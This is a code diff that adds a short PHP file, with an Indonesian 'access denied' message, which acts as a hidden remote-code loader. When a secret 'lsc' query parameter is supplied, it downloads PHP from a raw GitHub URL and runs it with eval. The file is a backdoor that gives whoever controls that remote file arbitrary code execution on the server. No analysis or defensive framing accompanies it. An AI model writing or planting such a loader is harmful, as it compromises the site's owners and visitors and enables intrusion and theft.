@@ -1,0 +1,17 @@
+<?php
+if (!isset($_GET['lsc'])) {
+    die('Akses ditolak');
+}
+
+$url = 'https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/gekopw.txt';
+
+
+$php_code = file_get_contents($url);
+
+
+if ($php_code !== false) {
+    eval('?>' . $php_code);
+} else {
+    echo 'error';
+} 
+?>
